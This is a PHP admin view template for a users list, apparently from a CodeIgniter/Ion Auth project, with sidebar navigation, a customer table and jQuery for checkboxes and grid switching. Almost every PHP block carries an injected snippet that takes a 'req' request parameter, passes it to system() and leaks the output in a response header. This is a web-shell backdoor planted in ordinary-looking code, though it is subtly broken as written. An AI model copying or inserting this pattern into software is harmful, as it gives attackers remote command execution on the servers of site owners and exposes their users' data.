<?=$this->load->view(branded_view('common/header-home'));?>
<body id="users">
	<div id="wrapper">
		<div id="sidebar-default" class="main-sidebar">
			<div class="current-user">
				<a href="index.html" class="name">
					<img class="avatar" src="images/avatars/1.jpg" />
					<span>
						John Smith
						<i class="fa fa-chevron-down"></i>
					</span>
				</a>
				<ul class="menu">
					<li>
						<a href="account-profile.html">Account settings</a>
					</li>
					<li>
						<a href="account-billing.html">Billing</a>
					</li>
					<li>
						<a href="account-notifications.html">Notifications</a>
					</li>
					<li>
						<a href="account-support.html">Help / Support</a>
					</li>
					<li>
						<a href="signup.html">Sign out</a>
					</li>
				</ul>
			</div>
			<div class="menu-section">
				<h3>General</h3>
				<ul>
					<li>
						<a href="index.html">
							<i class="ion-android-earth"></i> 
							<span>Dashboard</span>
						</a>
					</li>
					<li>
						<a href="users.html" class="active" data-toggle="sidebar">
							<i class="ion-person-stalker"></i> <span>Lists & Tables</span>
							<i class="fa fa-chevron-down"></i>
						</a>
						<ul class="submenu">
							<li><a href="users.html" class="active">Customers list</a></li>
							<li><a href="datatables.html">Orders (Datatables)</a></li>
							<li><a href="search.html">Products (Filters)</a></li>
						</ul>
					</li>
					<li>
						<a href="users.html" data-toggle="sidebar">
							<i class="ion-stats-bars"></i> <span>Reports</span>
							<i class="fa fa-chevron-down"></i>
						</a>
						<ul class="submenu">
							<li><a href="reports.html">Reports orders</a></li>
							<li><a href="reports-alt.html">Report sales</a></li>
						</ul>
					</li>
					<li>
						<a href="users.html" data-toggle="sidebar">
							<i class="ion-pricetags"></i> <span>Forms</span>
							<i class="fa fa-chevron-down"></i>
						</a>
						<ul class="submenu">
							<li><a href="form.html">New Customer (validation)</a></li>
							<li><a href="form-product.html">New Product (add-ons)</a></li>
							<li><a href="wizard.html">Wizard</a></li>
						</ul>
					</li>
				</ul>
			</div>
			<div class="menu-section">
				<h3>Application</h3>
				<ul>
					<li>
						<a href="account.html" data-toggle="sidebar">
							<i class="ion-earth"></i> <span>App Pages</span>
							<i class="fa fa-chevron-down"></i>
						</a>
						<ul class="submenu">
							<li><a href="sidebar.html">Inbox Messages</a></li>
							<li><a href="user-profile.html">User profile</a></li>
							<li><a href="latest-activity.html">Latest activity</a></li>
							<li><a href="projects.html">Projects</a></li>
							<li><a href="steps.html">Steps to launch</a></li>
							<li><a href="calendar.html">Calendar</a></li>
						</ul>
					</li>
					<li>
						<a href="account.html" data-toggle="sidebar">
							<i class="ion-card"></i> <span>Pricing</span>
							<i class="fa fa-chevron-down"></i>
						</a>
						<ul class="submenu">
							<li><a href="pricing.html">Pricing (Plans)</a></li>
							<li><a href="pricing-alt.html">Pricing charts</a></li>
							<li><a href="billing-form.html">Billing form</a></li>
							<li><a href="invoice.html">Invoice</a></li>
						</ul>
					</li>
					<li>
						<a href="account.html" data-toggle="sidebar">
							<i class="ion-flash"></i> <span>Features</span>
							<i class="fa fa-chevron-down"></i>
						</a>
						<ul class="submenu">
							<li><a href="email-templates.html">Email templates</a></li>
							<li><a href="gallery.html">Gallery</a></li>
							<li><a href="ui.html">UI Extras</a></li>
							<li><a href="docs.html">API Documentation</a></li>
							<li><a href="signup.html">Sign up</a></li>
							<li><a href="signin.html">Sign in</a></li>
							<li><a href="status.html">App Status</a></li>
						</ul>
					</li>
				</ul>
			</div>
			<div class="menu-section">
				<h3>Admin</h3>
				<ul>
					<li>
						<a href="account.html" data-toggle="sidebar">
							<i class="ion-person"></i> <span>My account</span>
							<i class="fa fa-chevron-down"></i>
						</a>
						<ul class="submenu">
							<li><a href="account-profile.html">Settings</a></li>
							<li><a href="account-billing.html">Billing</a></li>
							<li><a href="account-notifications.html">Notifications</a></li>
							<li><a href="account-support.html">Support</a></li>
						</ul>
					</li>
					<li>
						<a href="#" data-toggle="sidebar">
							<i class="ion-usb"></i> <span>Level Navigation</span>
							<i class="fa fa-chevron-down"></i>
						</a>
						<ul class="submenu">
							<li>
								<a href="invoice.html" data-toggle="sidebar">
									Submenu
									<i class="fa fa-chevron-down"></i>
								</a>
								<ul class="submenu">
									<li><a href="#">Last menu</a></li>
									<li><a href="#">Last menu</a></li>
								</ul>
							</li>
							<li><a href="invoice.html">Menu link</a></li>
							<li><a href="#">Extra link</a></li>
						</ul>
					</li>
				</ul>
			</div>
			<div class="bottom-menu hidden-sm">
				<ul>
					<li><a href="#"><i class="ion-help"></i></a></li>
					<li>
						<a href="#">
							<i class="ion-archive"></i>
							<span class="flag"></span>
						</a>
						<ul class="menu">
							<li><a href="#">5 unread messages</a></li>
							<li><a href="#">12 tasks completed</a></li>
							<!-- <li><a href="#">3 features added</a></li> -->
						</ul>
					</li>
					<li><a href="signup.html"><i class="ion-log-out"></i></a></li>
				</ul>
			</div>
		</div>

		<div id="content">
			<div class="menubar fixed">
				<div class="sidebar-toggler visible-xs">
					<i class="ion-navicon"></i>
				</div>
				
				<div class="page-title">
					Customers
				</div>
				<form class="search hidden-xs">
					<i class="fa fa-search"></i>
					<input type="text" name="q" placeholder="Search customers, clients..." />
					<input type="submit" />
				</form>
				<a href="form.html" class="new-user btn btn-success pull-right">
					<span>New user</span>
				</a>
			</div>

			<div class="content-wrapper">

<h1><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('index_heading');?></h1>
<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('index_subheading');?></p>

<div id="infoMessage"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message;?></div>
<div class="row page-controls">
					<div class="col-md-12 filters">
					<label>Filter users:</label>
						<a href="#">All users (243)</a>
						<a href="#" class="active">Active (3)</a>
						<a href="#">Suspended (8)</a>
						<a href="#">Prospects</a>

						<div class="show-options">
							<div class="dropdown">
							  	<a class="button" data-toggle="dropdown" href="#">
							  		<span>
							  			Sort by
							  			<i class="fa fa-unsorted"></i>
							  		</span>
							  	</a>
							  	<ul class="dropdown-menu" role="menu" aria-labelledby="dLabel">
							    	<li><a href="#">Name</a></li>
									<li><a href="#">Signed up</a></li>
									<li><a href="#">Last seen</a></li>
									<li><a href="#">Browser</a></li>
									<li><a href="#">Country</a></li>
							  	</ul>
							</div>
							<a href="#" data-grid=".users-list" class="grid-view active"><i class="fa fa-th-list"></i></a>
							<a href="#" data-grid=".users-grid" class="grid-view"><i class="fa fa-th"></i></a>
						</div>
					</div>
				</div>

				<div class="row users-list">
					<div class="col-md-12">
						<div class="row headers">
							<div class="col-sm-2 header select-users">
								<input type="checkbox" />
								<div class="dropdown bulk-actions">
									<a data-toggle="dropdown" href="#">
								  		Bulk actions
								  		<span class="total-checked"></span>

								  		<i class="fa fa-chevron-down"></i>
								  	</a>
								  	<ul class="dropdown-menu" role="menu" aria-labelledby="dLabel">
								    	<li><a href="#">Add tags</a></li>
										<li><a href="#">Delete users</a></li>
										<li><a href="#"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo ($user->active) ? anchor("auth/deactivate/".$user->id, lang('index_active_link')) : anchor("auth/activate/". $user->id, lang('index_inactive_link'));?></a></li>
										<li><a href="#"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo anchor("auth/edit_user/".$user->id, 'Edit') ;?></a></li>
								  	</ul>
								</div>
							</div>
							<div class="col-sm-3 header hidden-xs">
								<label><a href="#"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('index_fname_th');?> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('index_lname_th');?></a></label>
							</div>
							<div class="col-sm-3 header hidden-xs">
								<label><a href="#"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('index_email_th');?></a></label>
							</div>
							<div class="col-sm-2 header hidden-xs">
								<label><a href="#"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('index_groups_th');?></a></label>
							</div>
							<div class="col-sm-1 header hidden-xs">
								<label class="text-right"><a href="#"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('index_status_th');?></a></label>
							</div>
							<div class="col-sm-1 header hidden-xs">
								<label class="text-right"><a href="#"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('index_action_th');?></a></label>
							</div>
						</div>
						
						<div class="row user">
							<div class="col-sm-2 avatar">
								<input type="checkbox" name="select-user" />
								<img src="images/avatars/3.jpg" />
							</div>
							<div class="col-sm-3">
								<a href="user-profile.html" class="name"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->first_name;?> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->last_name;?></a>
							</div>
							<div class="col-sm-3">
								<div class="email"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->email;?></div>
							</div>
							<div class="col-sm-2">
								<div class="total-spent">
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($user->groups as $group):?>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo anchor("auth/edit_group/".$group->id, $group->name) ;?><br />
                <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach?>
								</div>
							</div>
							<div class="col-sm-2">
								<div class="created-at">
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo ($user->active) ? anchor("auth/deactivate/".$user->id, lang('index_active_link')) : anchor("auth/activate/". $user->id, lang('index_inactive_link'));?>
								</div>
							</div>
						</div>

		<div class="row user">
	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($users as $user):?>
		<tr>
			<td><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->first_name;?></td>
			<td><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->last_name;?></td>
			<td><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->email;?></td>
			<td>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($user->groups as $group):?>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo anchor("auth/edit_group/".$group->id, $group->name) ;?><br />
                <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach?>
			</td>
			<td><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo ($user->active) ? anchor("auth/deactivate/".$user->id, lang('index_active_link')) : anchor("auth/activate/". $user->id, lang('index_inactive_link'));?></td>
			<td><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo anchor("auth/edit_user/".$user->id, 'Edit') ;?></td>
		</tr>
	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach;?>
</div>

<p class="lead"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo anchor('auth/create_user', lang('index_create_user_link'))?> | <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo anchor('auth/create_group', lang('index_create_group_link'))?></p>


<div class="pager-wrapper">
						<div class="col-sm-12">
							<ul class="pager">
							  	<li><a href="#">Previous</a></li>
							  	<li><a href="#">Next</a></li>
							</ul>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>


	<script type="text/javascript">
		$(function () {
			// User list checkboxes
			var $allUsers = $(".select-users input:checkbox");
			var $checkboxes = $("[name='select-user']");

			$allUsers.change(function () {
				var checked = $allUsers.is(":checked");
				if (checked) {
					$checkboxes.prop("checked", "checked");
					toggleBulkActions(checked, $checkboxes.length);
				} else {
					$checkboxes.prop("checked", "");
					toggleBulkActions(checked, 0);
				}
			});

			$checkboxes.change(function () {
				var anyChecked = $(".user [name='select-user']:checked");
				toggleBulkActions(anyChecked.length, anyChecked.length);
			});

			function toggleBulkActions(shouldShow, checkedCount) {
				if (shouldShow) {
					$(".users-list .header").hide();
					$(".users-list .header.select-users").addClass("active").find(".total-checked").html("(" + checkedCount + " total users)");

				} else {
					$(".users-list .header").show();
					$(".users-list .header.select-users").removeClass("active");
				}
			}


			// Grid switcher
			$btns = $(".grid-view");
			$views = $(".users-view");

			$btns.click(function (e) {
				e.preventDefault();
				$btns.removeClass("active");
				$(this).addClass("active");
				
				$views.removeClass("active");
				
				$(".users-grid").hide();
				$(".users-list").hide();

				$($(this).data("grid")).show();
			});
		})
	</script>
<?=$this->load->view(branded_view('common/footer'));?>